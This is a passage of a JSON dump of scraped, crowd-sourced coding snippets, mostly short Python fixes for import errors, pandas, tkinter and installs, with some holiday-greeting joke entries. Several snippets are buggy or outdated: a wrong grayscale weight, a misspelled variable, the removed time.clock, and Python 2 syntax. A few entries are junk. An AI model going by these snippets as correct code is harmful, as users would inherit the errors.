3 French Hens 2 Turtle Doves and a Partridge in a Pear Tree\");         dayOfChristmas++;         }          if(dayOfChristmas == 8)         {         Console.WriteLine(\"On the eighth day of Christmas my true love sent to me: 8 Maids a Milking 7 Swans a Swimming 6 Geese a Laying 5 Golden Rings 4 Calling Birds 3 French Hens 2 Turtle Doves and a Partridge in a Pear Tree\");         dayOfChristmas++;         }          if(dayOfChristmas == 9)         {         Console.WriteLine(\"On the ninth day of Christmas my true love sent to me: 9 Ladies Dancing 8 Maids a Milking 7 Swans a Swimming 6 Geese a Laying 5 Golden Rings 4 Calling Bird 3 French Hens 2 Turtle Doves and a Partridge in a Pear Tree\");         dayOfChristmas++;         }          if(dayOfChristmas == 10)         {         Console.WriteLine(\"On the tenth day of Christmas my true love sent to me: 10 Lords a Leaping 9 Ladies Dancing 8 Maids a Milking 7 Swans a Swimming 6 Geese a Laying 5 Golden Rings 4 Calling Birds 3 French Hens 2 Turtle Doves and a Partridge in a Pear Tree\");         dayOfChristmas++;         }          if(dayOfChristmas == 11)         {         Console.WriteLine(\"On the eleventh day of Christmas my true love sent to me: 11 Pipers Piping 10 Lords a Leaping 9 Ladies Dancing 8 Maids a Milking 7 Swans a Swimming 6 Geese a Laying 5 Golden Rings 4 Calling Birds 3 French Hens 2 Turtle Doves and a Partridge in a Pear Tree\");         dayOfChristmas++;         }          if(dayOfChristmas == 12)         {         Console.WriteLine(\"On the twelfth day of Christmas my true love sent to me 12 Drummers Drumming 11 Pipers Piping 10 Lords a Leaping 9 Ladies Dancing 8 Maids a Milking 7 Swans a Swimming 6 Geese a Laying 5 Golden Rings 4 Calling Birds 3 French Hens 2 Turtle Doves and a Partridge in a Pear Tree\");         dayOfChristmas++;         }                                  Console.WriteLine(\"Happy Holidays\");\nif December 25  \tPrint('Christmas')\nHappy Holidays Everyone! \nprint('Happy Holidays God Bless!!')\nMerry Christmas everyone. 2020 was weird but lets all hope that 2021 is better.\nHAPPY HOLIDAYS\nHappy Festivus!\nHappy Holidays!!!\n",
    "reg_date": "2021-10-12T11:27:32.000Z"
  },
  {
    "id": 64,
    "keyword": null,
    "link": null,
    "title": " DeprecationWarning: an integer is required (got type float). Implicit conversion to integers using   int   is deprecated, and may be removed in a future version of Python.",
    "description": "The warning is related to the coordinate parameter of blit(). Floating point coordinates, would mean that the origin of the Surface is somewhere in between to pixels in the window. That doesn't make much sense. The coordinates are automatically, implicitly truncated and that is indicated by the warning. Use either int or round to convert the floating point coordinates to integral numbers:  win.blit(playerStand, (round(x), round(y)))\n",
    "reg_date": "2021-10-12T11:27:32.000Z"
  },
  {
    "id": 65,
    "keyword": null,
    "link": null,
    "title": " Directly changing the fonts in the plotting file",
    "description": "from matplotlib import rc font = {'size'   : 16} matplotlib.rc('font', **font)  # change font matplotlib.rcParams['font.sans-serif'] = \"Arial\" matplotlib.rcParams['font.family'] = \"sans-serif\" \n",
    "reg_date": "2021-10-12T11:27:32.000Z"
  },
  {
    "id": 66,
    "keyword": null,
    "link": null,
    "title": " Django import Response",
    "description": "from rest_framework.response import Response\n",
    "reg_date": "2021-10-12T11:27:32.000Z"
  },
  {
    "id": 67,
    "keyword": null,
    "link": null,
    "title": " Drop Rows by Index in dataframe",
    "description": "df = df.drop(index=2) \n",
    "reg_date": "2021-10-12T11:27:32.000Z"
  },
  {
    "id": 68,
    "keyword": null,
    "link": null,
    "title": " DtypeWarning: Columns (47) have mixed types.Specify dtype option on import or set low memory=False",
    "description": "dashboard_df = pd.read_csv(p_file, sep=',', error_bad_lines=False, index_col=False, dtype='unicode')\n",
    "reg_date": "2021-10-12T11:27:32.000Z"
  },
  {
    "id": 69,
    "keyword": null,
    "link": null,
    "title": " Dunkleosteus",
    "description": "mentally_fit = True physically_fit = True socially_fit = True  if mentally_fit and physicall_fit and socially_fit:   print('You are healthy in all aspects of life') else:   print('You are not healthy in all aspects. Do not feel shy to get help')\nWtf is a jocky.\n",
    "reg_date": "2021-10-12T11:27:32.000Z"
  },
  {
    "id": 70,
    "keyword": null,
    "link": null,
    "title": " E: Unable to locate package python3-pip",
    "description": "sudo apt-get install software-properties-common sudo apt-add-repository universe sudo apt-get update sudo apt-get install python-pip\nsudo add-apt-repository universe sudo apt-get update \napt-get install curl  curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py  python get-pip.py \n",
    "reg_date": "2021-10-12T11:27:32.000Z"
  },
  {
    "id": 71,
    "keyword": null,
    "link": null,
    "title": " E: Unable to locate package python3-pip docker file",
    "description": "....  # use this for ubuntu 14.04 or 16.04 RUN apt-get update -y && apt-get install -y software-properties-common && add-apt-repository ppa:deadsnakes/ppa  RUN apt-get update -y && apt-get install -y \\  python3.6 \\  python3-pip \\  curl \\  git  RUN pip3 install --upgrade pip   ...\n",
    "reg_date": "2021-10-12T11:27:33.000Z"
  },
  {
    "id": 72,
    "keyword": null,
    "link": null,
    "title": " ERROR:  character with byte sequence 0xd0 0x9f in encoding \"UTF8\" has no equivalent in encoding \"LATIN1\"",
    "description": "SET client_encoding = 'UTF8';\n",
    "reg_date": "2021-10-12T11:27:33.000Z"
  },
  {
    "id": 73,
    "keyword": null,
    "link": null,
    "title": " Emoji In Python",
    "description": "# Install Emoji Package Using $ pip install emoji  from emoji import emojize print(emojize(\":thumbs_up:\"))\n",
    "reg_date": "2021-10-12T11:27:33.000Z"
  },
  {
    "id": 74,
    "keyword": null,
    "link": null,
    "title": " EnvironmentError command line",
    "description": "If you are having this issue, I suggest you put this in command line:  pip install --user package  (Obviously make sure to change package to whatever package you are installing)\n",
    "reg_date": "2021-10-12T11:27:33.000Z"
  },
  {
    "id": 75,
    "keyword": null,
    "link": null,
    "title": " Exception: ROM is missing for space invaders, see https://github.com/openai/atari-py#roms for instructions site:stackoverflow.com",
    "description": "import urllib.request urllib.request.urlretrieve('http://www.atarimania.com/roms/Roms.rar','Roms.rar') !pip install unrar !unrar x Roms.rar !mkdir rars !mv HC\\ ROMS.zip   rars !mv ROMS.zip  rars !python -m atari_py.import_roms rars \n",
    "reg_date": "2021-10-12T11:27:33.000Z"
  },
  {
    "id": 76,
    "keyword": null,
    "link": null,
    "title": " File \"manage.py\", line 17) from exc^ SyntaxError: invalid syntax",
    "description": "try python3 insead of python\n",
    "reg_date": "2021-10-12T11:27:33.000Z"
  },
  {
    "id": 77,
    "keyword": null,
    "link": null,
    "title": " Find the value counts for the column 'your column'",
    "description": "df[\"your_column\"].value_counts()\n",
    "reg_date": "2021-10-12T11:27:33.000Z"
  },
  {
    "id": 78,
    "keyword": null,
    "link": null,
    "title": " Function to a button in tkinter",
    "description": "from tkinter import * #Creating a win win = Tk() #Giving a Function To The Button def btn1():   print(\"I Don't Know Your Name\") #Creating The Button button1 =  Button(win, text=\"Click Me To Print SomeThing\", command=btn1) #put on screen button1.pack() win.mainloop() #NB:This programme Will Print Something In The Terminal #Check My Profile To See How We Print On The Screen Or Type In Google \"Tkinter Label\"\n",
    "reg_date": "2021-10-12T11:27:33.000Z"
  },
  {
    "id": 79,
    "keyword": null,
    "link": null,
    "title": " Get value from TextCtrl wxpython",
    "description": "TextCtrlInstance.GetValue()\n",
    "reg_date": "2021-10-12T11:27:33.000Z"
  },
  {
    "id": 80,
    "keyword": null,
    "link": null,
    "title": " Given an integer, , and space-separated integers as input, create a tuple, , of those integers. Then compute and print the result of .",
    "description": " n = int(input())     integer_list =tuple( map(int, input().split()))     print(hash(integer_list)) #Return the hash value of the object (if it has one). Hash values are integers.      \t\t\t\t\t\t  #They are used to quickly compare     \t\t\t\t\t\t  #dictionary keys during a dictionary lookup.\nn = int(input()) elements = map(int, input().split()) t=tuple(elements) print(hash(t))\n",
    "reg_date": "2021-10-12T11:27:34.000Z"
  },
  {
    "id": 81,
    "keyword": null,
    "link": null,
    "title": " HOW TO GET LSIT AS AN INPUT IN PYTHON",
    "description": "# For list of integers lst1 = []      # For list of strings/chars lst2 = []      lst1 = [int(item) for item in input(\"Enter the list items : \").split()]    lst2 = [item for item in input(\"Enter the list items : \").split()]    print(lst1) print(lst2) \n",
    "reg_date": "2021-10-12T11:27:34.000Z"
  },
  {
    "id": 82,
    "keyword": null,
    "link": null,
    "title": " Happy New Year!",
    "description": "if date == 1/1/2021: \t\tprint(\"Happy New Year!!\")\t\nThere are two types of programmers,  HTML programmers  and real programmers  Happy new year to both of them\nHappy new year to all those aspiring to be a programmer, and to those who  have seen freams for this new year. bless ya\nhappy new years for all of you!!! i hope that this.year will be a true success\nalert(\"Happy New Year!\")\nHave a happy 2021! \ntry {   Year year2020 = new Year(2020);   year2020.do(); } catch Covid19 {   System.out.println(\"Wow, 2020 sucked\"); } finally {   Year year2021 = new Year(2021);   System.out.println(\"Happy new year!\"); }\nHello world \"Happy new year\" \nHappy new year to all\nif(!2020) \tDebug.Log(\"Happy New Year! :D\")\n",
    "reg_date": "2021-10-12T11:27:34.000Z"
  },
  {
    "id": 83,
    "keyword": null,
    "link": null,
    "title": " How are Python dictionaries different from Python lists?",
    "description": "list1 = [\"a\", \"b\" ,\"c\"] # a bunch of things  dictionary1 = {\"a\":1, \"b\":2, \"c\":3} # like a list but each part of it has an associated extra bit \n",
    "reg_date": "2021-10-12T11:27:34.000Z"
  },
  {
    "id": 84,
    "keyword": null,
    "link": null,
    "title": " How can I get terminal output in python",
    "description": " >>> import subprocess >>> cmd = [ 'echo', 'arg1', 'arg2' ] >>> output = subprocess.Popen( cmd, stdout=subprocess.PIPE ).communicate()[0] >>> print output arg1 arg2  >>>   There is a bug in using of the subprocess.PIPE. For the huge output use this:  import subprocess import tempfile  with tempfile.TemporaryFile() as tempf:     proc = subprocess.Popen(['echo', 'a', 'b'], stdout=tempf)     proc.wait()     tempf.seek(0)     print tempf.read() \n",
    "reg_date": "2021-10-12T11:27:34.000Z"
  },
  {
    "id": 85,
    "keyword": null,
    "link": null,
    "title": " How can i get face detected bounding-box in face-mesh",
    "description": "if res.multi_face_landmarks:             for faceLms in res.multi_face_landmarks:                 mpDraw.draw_landmarks(imgOriginal, faceLms, mpFaceMesh.FACE_CONNECTIONS, drawSpec, drawSpec)                  h, w, c = imgOriginal.shape                 cx_min = w                 cy_min = h                 cx_max = cy_max = 0                 for id, lm in enumerate(faceLms.landmark):                     cx, cy = int(lm.x * w), int(lm.y * h)                     if cx < cx_min:                         cx_min = cx                     if cy < cy_min:                         cy_min = cy                     if cx > cx_max:                         cx_max = cx                     if cy > cy_max:                         cy_max = cy \t\t\t\tcv2.rectangle(imgOriginal, (cx_min, cy_min), (cx_max, cy_max), (255, 255, 0), 2)\n",
    "reg_date": "2021-10-12T11:27:34.000Z"
  },
  {
    "id": 86,
    "keyword": null,
    "link": null,
    "title": " How do I set Conda to activate the base environment by default?",
    "description": "conda config --set auto_activate_base true\nconda create -n [env-name] python\nconda activate myenv\n",
    "reg_date": "2021-10-12T11:27:34.000Z"
  },
  {
    "id": 87,
    "keyword": null,
    "link": null,
    "title": " How print ?",
    "description": "#def test print(\"Hello, world!\") #for text print(test) #for variable print(\"Hello,\", test) # for text + variable\n",
    "reg_date": "2021-10-12T11:27:34.000Z"
  },
  {
    "id": 88,
    "keyword": null,
    "link": null,
    "title": " How to check how much time elapsed Python",
    "description": "import time t0= time.clock() print(\"Hello\") t1 = time.clock() - t0 print(\"Time elapsed: \", t1) # CPU seconds elapsed (floating point)\n",
    "reg_date": "2021-10-12T11:27:35.000Z"
  },
  {
    "id": 89,
    "keyword": null,
    "link": null,
    "title": " How to convert ton to kg using python",
    "description": "try:     Ton = int(input(\"Ton:- \"))     To_kg = 907*Ton     print(Ton,\"Ton = \",To_kg,\"Kg\") except:     print(\"Ton's must be number\")\n",
    "reg_date": "2021-10-12T11:27:35.000Z"
  },
  {
    "id": 90,
    "keyword": null,
    "link": null,
    "title": " How to copy any text using python",
    "description": "from tkinter import Tk  def Copy(txt):     r = Tk()     r.withdraw()     r.clipboard_clear()     r.clipboard_append(str(txt))     r.update() # now it stays on the clipboard after the window is closed     r.destroy() Copy(\"It Works\")\nimport pyperclip pyperclip.copy('The text to be copied to the clipboard.') spam = pyperclip.paste() \n",
    "reg_date": "2021-10-12T11:27:35.000Z"
  },
  {
    "id": 91,
    "keyword": null,
    "link": null,
    "title": " How to get random int between two numbers python",
    "description": "import random print(random.randint(10,100))    this will output somthing between 10 and 100\n",
    "reg_date": "2021-10-12T11:27:35.000Z"
  },
  {
    "id": 92,
    "keyword": null,
    "link": null,
    "title": " How to increase text size tkinter",
    "description": "label = Label(root, text=\"WELCOME TO ScOMPANY\", font=(\"Courier\", 44))\n",
    "reg_date": "2021-10-12T11:27:35.000Z"
  },
  {
    "id": 93,
    "keyword": null,
    "link": null,
    "title": " How to justify a string in Python f-strings",
    "description": "s1 = 'Python' s2 = 'ython' s3 = 'thon' s4 = 'hon' s5 = 'on' s6 = 'n'  print(f'{s1:>6}') print(f'{s2:>6}') print(f'{s3:>6}') print(f'{s4:>6}') print(f'{s5:>6}') print(f'{s6:>6}') ... Python  ython   thon    hon     on      n  .... \n",
    "reg_date": "2021-10-12T11:27:35.000Z"
  },
  {
    "id": 94,
    "keyword": null,
    "link": null,
    "title": " How to log a python crash?",
    "description": "python script.py >> /logdir/script.py.log 2>&1\n",
    "reg_date": "2021-10-12T11:27:35.000Z"
  },
  {
    "id": 95,
    "keyword": null,
    "link": null,
    "title": " How to make an simple python client",
    "description": "import time import sys import socket import os  s = socket.socket() host = \"User-PC\" port = 8080 s.connect((host,port)) print(\"\") print(\"connected to server\") print(\"\") \n",
    "reg_date": "2021-10-12T11:27:36.000Z"
  },
  {
    "id": 96,
    "keyword": null,
    "link": null,
    "title": " How to normalize the data to get to the same range in python pandas",
    "description": "# Assuming same lines from your example cols_to_norm = ['Age','Height'] survey_data[cols_to_norm] = survey_data[cols_to_norm].apply(lambda x: (x - x.min()) / (x.max() - x.min()))\n",
    "reg_date": "2021-10-12T11:27:36.000Z"
  },
  {
    "id": 97,
    "keyword": null,
    "link": null,
    "title": " How to open dialog box to select folder in python",
    "description": ">>> from tkinter import Tk, filedialog >>> >>> root = Tk() # pointing root to Tk() to use it as Tk() in program. >>> root.withdraw() # Hides small tkinter window. '' >>> root.attributes('-topmost', True) # Opened windows will be active. above all windows despite of selection. '' >>> open_file = filedialog.askdirectory() # Returns opened path as str >>> print(open_file)  C:/Users/User/Music >>> \n",
    "reg_date": "2021-10-12T11:27:36.000Z"
  },
  {
    "id": 98,
    "keyword": null,
    "link": null,
    "title": " How to play music without pygame",
    "description": "from playsound import playsound playsound('audio.mp3') #Hope it helps :)\n",
    "reg_date": "2021-10-12T11:27:36.000Z"
  },
  {
    "id": 99,
    "keyword": null,
    "link": null,
    "title": " How to remove all characters after \\ character in python?",
    "description": "s = 'abc12321cba'  print(s.replace('a', '')) \nUse str. split() to remove everything after a character in a string a_string = \"ab-cd\" split_string = a_string. split(\"-\", 1) Split into \"ab\" and \"cd\" substring = split_string[0] print(substring)\ntext = input() sep = '...' stripped = text.split(sep, 1)[0] print(stripped)\nsep = '...' stripped = text.split(sep, 1)[0]\nsep = '...' stripped = text.split(sep, 1)[0] \n",
    "reg_date": "2021-10-12T11:27:36.000Z"
  },
  {
    "id": 100,
    "keyword": null,
    "link": null,
    "title": " How to scrape gmailnator email using python",
    "description": "import gmailnator  csrf_token, email = gmailnator.generate_email() print(f'Email: {email}') print(f'Token: {csrf_token}') input('Send email, wait a few minutes to ensure that it has been received then press enter to continue...') emails = gmailnator.check_emails(csrf_token, email) print(f'Got {len(emails)} emails') for mail in emails:     print(f'Subject: {mail[\"subject\"]}')     print(f'Body: {mail[\"body\"]}')     print(f'Link: {mail[\"link\"]}')     print(f'Time: {mail[\"time\"]}')     print(f'Full body: {gmailnator.get_message(mail[\"link\"], csrf_token)}') \n",
    "reg_date": "2021-10-12T11:27:36.000Z"
  },
  {
    "id": 101,
    "keyword": null,
    "link": null,
    "title": " How to set \"Unnamed: 0\" column as the index in a DataFrame",
    "description": "pd.read_csv('file.csv', index_col=[0])\n",
    "reg_date": "2021-10-12T11:27:36.000Z"
  },
  {
    "id": 102,
    "keyword": null,
    "link": null,
    "title": " How to use open weather weather api for pytho",
    "description": "# importing requests and json import requests, json # base URL BASE_URL = \"https://api.openweathermap.org/data/2.5/weather?\" # City Name CITY = \"Hyderabad\" # API key API_KEY = \"Your API Key\" # upadting the URL URL = BASE_URL + \"q=\" + CITY + \"&appid=\" + API_KEY # HTTP request response = requests.get(URL) # checking the status code of the request if response.status_code == 200:    # getting data in the json format    data = response.json()    # getting the main dict block    main = data['main']    # getting temperature    temperature = main['temp']    # getting the humidity    humidity = main['humidity']    # getting the pressure    pressure = main['pressure']    # weather report    report = data['weather']    print(f\"{CITY:-^30}\")    print(f\"Temperature: {temperature}\")    print(f\"Humidity: {humidity}\")    print(f\"Pressure: {pressure}\")    print(f\"Weather Report: {report[0]['description']}\") else:    # showing the error message    print(\"Error in the HTTP request\")\n",
    "reg_date": "2021-10-12T11:27:36.000Z"
  },
  {
    "id": 103,
    "keyword": null,
    "link": null,
    "title": " Image to grayscale using python",
    "description": "import numpy as np import matplotlib.pyplot as plt import matplotlib.image as mpimg  def rgb2gray(rgb):     return np.dot(rgb[...,:3], [0.299, 0.587, 0.144])  img = mpimg.imread('img.png')  gray = rgb2gray(img)  plt.imshow(gray, cmap='gray')  plt.savefig('greyscale.png') plt.show() \n",
    "reg_date": "2021-10-12T11:27:36.000Z"
  },
  {
    "id": 104,
    "keyword": null,
    "link": null,
    "title": " ImportError: Couldn",
    "description": "# Make sure you have virtualenv set up on the directory your working on. # To set up virtualenv, first download it (If you haven't yet) # Do it by typing in this on the terminal:    pip install virtualenv   # Then activate the virtual environment by doing these steps on the terminal python -m venv venv # Or python3 -m venv venv  # Then do this to activate it: cd myproject/venv/Scripts/activate\n",
    "reg_date": "2021-10-12T11:27:36.000Z"
  },
  {
    "id": 105,
    "keyword": null,
    "link": null,
    "title": " ImportError: No module named 'transforms3d'",
    "description": "pip install transforms3d\n",
    "reg_date": "2021-10-12T11:27:37.000Z"
  },
  {
    "id": 106,
    "keyword": null,
    "link": null,
    "title": " ImportError: No module named django.core.wsgi",
    "description": "$ sudo apt-get remove libapache2-mod-python libapache2-mod-wsgi $ sudo apt-get install libapache2-mod-wsgi-py3\nfrom django.urls import reverse\n",
    "reg_date": "2021-10-12T11:27:37.000Z"
  },
  {
    "id": 107,
    "keyword": null,
    "link": null,
    "title": " ImportError: No module named easydict",
    "description": "Install it using the following command $ pip install easydict  or   $ sudo pip install easydict\nsudo pip install easydict\n",
    "reg_date": "2021-10-12T11:27:37.000Z"
  },
  {
    "id": 108,
    "keyword": null,
    "link": null,
    "title": " ImportError: No module named pandas",
    "description": "pip3 install pandas #or pip install pandas   #https://www.fiverr.com/tamerjarrar\npip install pandas\nAlready Solved at ImportError: No module named pandas\nwhich python python --version which pip \n",
    "reg_date": "2021-10-12T11:27:37.000Z"
  },
  {
    "id": 109,
    "keyword": null,
    "link": null,
    "title": " ImportError: cannot import name 'TFAutoModel' from 'transformers'",
    "description": "! pip list | grep \"tensorflow\"   # Check tensorflow==2.0.0, tensorflow-gpu==2.0.0 ! pip list | grep \"transformers\" # Check transformers>=2.0.0\n",
    "reg_date": "2021-10-12T11:27:37.000Z"
  },
  {
    "id": 110,
    "keyword": null,
    "link": null,
    "title": " ImportError: cannot import name 'to categorical'",
    "description": "#keras is now fully integrated into tensorflow, so import like this: from tensorflow.keras.utils import to_categorical\n",
    "reg_date": "2021-10-12T11:27:37.000Z"
  },
  {
    "id": 111,
    "keyword": null,
    "link": null,
    "title": " ImportError: dynamic module does not define module export function",
    "description": "# NOTES: ROS Melodic -- Python3.7 # Solution is to build cv_bridge with python3. sudo apt-get install python-catkin-tools python3-dev python3-catkin-pkg-modules python3-numpy python3-yaml ros-melodic-cv-bridge  # Create catkin workspace mkdir catkin_workspace cd catkin_workspace catkin init  # Instruct catkin to set cmake variables catkin config -DPYTHON_EXECUTABLE=/usr/bin/python3 -DPYTHON_INCLUDE_DIR=/usr/include/python3.7m -DPYTHON_LIBRARY=/usr/lib/x86_64-linux-gnu/libpython3.7m.so # Instruct catkin to install built packages into install place. It is $CATKIN_WORKSPACE/install folder catkin config --install  # Clone cv_bridge src git clone https://github.com/ros-perception/vision_opencv.git src/vision_opencv # Find version of cv_bridge in your repository apt-cache show ros-melodic-cv-bridge | grep Version     Version: 1.13-0******  # Checkout right version in git repo. In our case it is 1.13.0 cd src/vision_opencv/ git checkout 1.13.0 cd ../../ # Build catkin build cv_bridge # Extend environment with new package source install/setup.bash --extend  # And you can test it with the following  $ python3 Python 3.7.5 (default, Feb 23 2021, 13:22:40)  [GCC 8.4.0] on linux Type \"help\", \"copyright\", \"credits\" or \"license\" for more information. >>> from cv_bridge.boost.cv_bridge_boost import getCvType >>>   # Or add it to your bashrc file source ~/catkin_workspace/install/setup.bash --extend\n",
    "reg_date": "2021-10-12T11:27:37.000Z"
  },
  {
    "id": 112,
    "keyword": null,
    "link": null,
    "title": " Import \"django.core.urlresolvers\" could not be resolved",
    "description": "#Django 2.0 removes the django.core.urlresolvers module, #which was moved to django.urls in version 1.10. #You should change any import to use django.urls instead, like this: from django.urls import reverse \n",
    "reg_date": "2021-10-12T11:27:37.000Z"
  },
  {
    "id": 113,
    "keyword": null,
    "link": null,
    "title": " Import \"matplotlib\" could not be resolved django",
    "description": "pip install matplotlib\n",
    "reg_date": "2021-10-12T11:27:37.000Z"
  },
  {
    "id": 114,
    "keyword": null,
    "link": null,
    "title": " Import numpy",
    "description": "import numpy as np\n>>> import numpy as np >>> a = np.array([0, 1, 2, 3]) >>> a array([0, 1, 2, 3]) \nimport numpy  #or import numpy as np\nx = 3 print(type(x)) # Prints \"<class 'int'>\" print(x)       # Prints \"3\" print(x + 1)   # Addition; prints \"4\" print(x - 1)   # Subtraction; prints \"2\" print(x * 2)   # Multiplication; prints \"6\" print(x ** 2)  # Exponentiation; prints \"9\" x += 1 print(x)  # Prints \"4\" x *= 2 print(x)  # Prints \"8\" y = 2.5 print(type(y)) # Prints \"<class 'float'>\" print(y, y + 1, y * 2, y ** 2) # Prints \"2.5 3.5 5.0 6.25\" \nt = True f = False print(type(t)) # Prints \"<class 'bool'>\" print(t and f) # Logical AND; prints \"False\" print(t or f)  # Logical OR; prints \"True\" print(not t)   # Logical NOT; prints \"False\" print(t != f)  # Logical XOR; prints \"True\" \n",
    "reg_date": "2021-10-12T11:27:38.000Z"
  },
  {
    "id": 115,
    "keyword": null,
    "link": null,
    "title": " Increase \"bar width\" \"px.bar\"",
    "description": "import plotly.express as px  fig = px.bar(x = ['a', 'b', 'c'], y = [5, 10, 12])  for data in fig.data:     data[\"width\"] = 0.15 #Change this value for bar widths      fig.show()\nimport os import pandas as pd from sklearn import preprocessing import plotly.express as px import plotly.offline from plotly.offline import plot import plotly.graph_objects as go import numpy as np\n",
    "reg_date": "2021-10-12T11:27:38.000Z"
  },
  {
    "id": 116,
    "keyword": null,
    "link": null,
    "title": " Inorder, Preorder, Postorder in Python",
    "description": "# Tree traversal in Python   class Node:     def __init__(self, item):         self.left = None         self.right = None         self.val = item   def inorder(root):      if root:         # Traverse left         inorder(root.left)         # Traverse root         print(str(root.val) + \"->\", end='')         # Traverse right         inorder(root.right)   def postorder(root):      if root:         # Traverse left         postorder(root.left)         # Traverse right         postorder(root.right)         # Traverse root         print(str(root.val) + \"->\", end='')   def preorder(root):      if root:         # Traverse root         print(str(root.val) + \"->\", end='')         # Traverse left         preorder(root.left)         # Traverse right         preorder(root.right)   root = Node(1) root.left = Node(2) root.right = Node(3) root.left.left = Node(4) root.left.right = Node(5)  print(\"Inorder traversal \") inorder(root)  print(\"\\nPreorder traversal \") preorder(root)  print(\"\\nPostorder traversal \") postorder(root)Copied\n",
    "reg_date": "2021-10-12T11:27:38.000Z"
  },
  {
    "id": 117,
    "keyword": null,
    "link": null,
    "title": " Install Spark on google Colab",
    "description": "# Install java !apt-get install openjdk-8-jdk-headless -qq > /dev/null  # Install spark (change the version number if needed) !wget -q https://archive.apache.org/dist/spark/spark-3.0.0/spark-3.0.0-bin-hadoop3.2.tgz  # Unzip the spark file to the current folder !tar xf spark-3.0.0-bin-hadoop3.2.tgz  # Set your spark folder to your system path environment.  import os os.environ[\"JAVA_HOME\"] = \"/usr/lib/jvm/java-8-openjdk-amd64\" os.environ[\"SPARK_HOME\"] = \"/content/spark-3.0.0-bin-hadoop3.2\"  # Install findspark using pip !pip install -q findspark  # Spark for Python !pip install pyspark\n",
    "reg_date": "2021-10-12T11:27:38.000Z"
  },
  {
    "id": 118,
    "keyword": null,
    "link": null,
    "title": " Installing packages from requirements.txt file",
    "description": "$ pip install -r requirements.txt \n",
    "reg_date": "2021-10-12T11:27:38.000Z"
  },
  {
    "id": 119,
    "keyword": null,
    "link": null,
    "title": " Jun 12, 2007 hoteis othon",
    "description": " f if x = 2: true  \n",
    "reg_date": "2021-10-12T11:27:38.000Z"
  },
  {
    "id": 120,
    "keyword": null,
    "link": null,
    "title": " Le module SIP n'a pas pu être chargé. Le support Python va être désactivé. ubbuntu 20.04",
    "description": "sudo pip3 uninstall PyQt5 sudo apt-get install python3-pyqt5\n",
    "reg_date": "2021-10-12T11:27:38.000Z"
  },
  {
    "id": 121,
    "keyword": null,
    "link": null,
    "title": " LookupError: unknown encoding: idna python",
    "description": "import encodings.idna\n",
    "reg_date": "2021-10-12T11:27:38.000Z"
  },
  {
    "id": 122,
    "keyword": null,
    "link": null,
    "title": " Mahesh Jamdade",
    "description": "import\n",
    "reg_date": "2021-10-12T11:27:38.000Z"
  },
  {
    "id": 123,
    "keyword": null,
    "link": null,
    "title": " Make solutions faster in python",
    "description": "import psyco  psyco.full() \n",
    "reg_date": "2021-10-12T11:27:38.000Z"
  },
  {
    "id": 124,
    "keyword": null,
    "link": null,
    "title": " Mean Kurtosis of all rows pandas",
    "description": "# Kurtosis of all rows for specific range of columns df['kurt'] = df.iloc[:,<col_num_start>:<col_num_end>].kurtosis(axis = 1)  # Kurtosis of all rows for specific columns df['kurt'] = df.iloc[:,[<col_1>,<col_2>,<col_3>].kurtosis(axis = 1)  # Specify the columns in a list by number\n",
    "reg_date": "2021-10-12T11:27:39.000Z"
  },
  {
    "id": 125,
    "keyword": null,
    "link": null,
    "title": " Message: 'chromedriver' executable needs to be in PATH. Please see https://sites.google.com/a/chromium.org/chromedriver/home",
    "description": "You can download ChromeDriver here: https://sites.google.com/a/chromium.org/chromedriver/downloads  Then you have multiple options:  add it to your system path put it in the same directory as your python script specify the location directly via executable_path  driver = webdriver.Chrome(executable_path='C:/path/to/chromedriver.exe') \nfrom selenium import webdriver from webdriver_manager.chrome import ChromeDriverManager  driver = webdriver.Chrome(ChromeDriverManager().install()) \n driver = webdriver.Chrome('/path/to/chromedriver') \n",
    "reg_date": "2021-10-12T11:27:39.000Z"
  },
  {
    "id": 126,
    "keyword": null,
    "link": null,
    "title": " ModuleNotFoundError: No module named 'Crypto'",
    "description": ">> pip install pycryptodome  from Crypto.Cipher import AES  #Works\npip install pycryptodome\n>> pip install pycryptodomex from Cryptodome.Cipher import AES \n",
    "reg_date": "2021-10-12T11:27:39.000Z"
  },
  {
    "id": 127,
    "keyword": null,
    "link": null,
    "title": " ModuleNotFoundError: No module named 'Cython'",
    "description": "pip install --upgrade cython \npython setup.py install \n",
    "reg_date": "2021-10-12T11:27:39.000Z"
  },
  {
    "id": 128,
    "keyword": null,
    "link": null,
    "title": " ModuleNotFoundError: No module named 'MySQLdb' in windows",
    "description": "You can install mysqlclient with pip  If using Python3, try this:  pip3 install mysqlclient  or in Python2  pip install mysqlclient\nsudo apt-get install libmysqlclient-dev sudo apt-get install libssl-dev pip install mysqlclient\nsudo apt-get install -y python3-mysqldb\n",
    "reg_date": "2021-10-12T11:27:39.000Z"
  },
  {
    "id": 129,
    "keyword": null,
    "link": null,
    "title": " ModuleNotFoundError: No module named 'StringIO'",
    "description": "pip install django-cors-headers  #https://www.fiverr.com/tamerjarrar\npip install xlwt pip3 install xlwt\ntry:     from StringIO import StringIO ## for Python 2 except ImportError:     from io import StringIO ## for Python 3 \n",
    "reg_date": "2021-10-12T11:27:39.000Z"
  },
  {
    "id": 130,
    "keyword": null,
    "link": null,
    "title": " ModuleNotFoundError: No module named 'en core web sm'",
    "description": "pip install https://github.com/explosion/spacy-models/releases/download/en_core_web_sm-2.2.0/en_core_web_sm-2.2.0.tar.gz \n",
    "reg_date": "2021-10-12T11:27:39.000Z"
  },
  {
    "id": 131,
    "keyword": null,
    "link": null,
    "title": " ModuleNotFoundError: No module named 'exceptions'",
    "description": "pip install python-docx  \n",
    "reg_date": "2021-10-12T11:27:39.000Z"
  },
  {
    "id": 132,
    "keyword": null,
    "link": null,
    "title": " ModuleNotFoundError: No module named 'matplotlib'",
    "description": "pip install matplotlib\npip install matplotlib \n%matplotlib inline import matplotlib.pyplot as plt \n",
    "reg_date": "2021-10-12T11:27:39.000Z"
  },
  {
    "id": 133,
    "keyword": null,
    "link": null,
    "title": " ModuleNotFoundError: No module named 'pandas'",
    "description": "pip3 install pandas #or pip install pandas   #https://www.fiverr.com/tamerjarrar\npip install pandas\nAlready Solved at ImportError: No module named pandas\nwhich python python --version which pip \n",
    "reg_date": "2021-10-12T11:27:39.000Z"
  },
  {
    "id": 134,
    "keyword": null,
    "link": null,
    "title": " ModuleNotFoundError: No module named 'png'",
    "description": "pip install pypng  and then import in your code as  import png\n",
    "reg_date": "2021-10-12T11:27:40.000Z"
  },
  {
    "id": 135,
    "keyword": null,
    "link": null,
    "title": " ModuleNotFoundError: No module named 'pydub'",
    "description": "pip install pydub\nuse this command in python3 terminal:  pip install --upgrade cheroot \n",
    "reg_date": "2021-10-12T11:27:40.000Z"
  },
  {
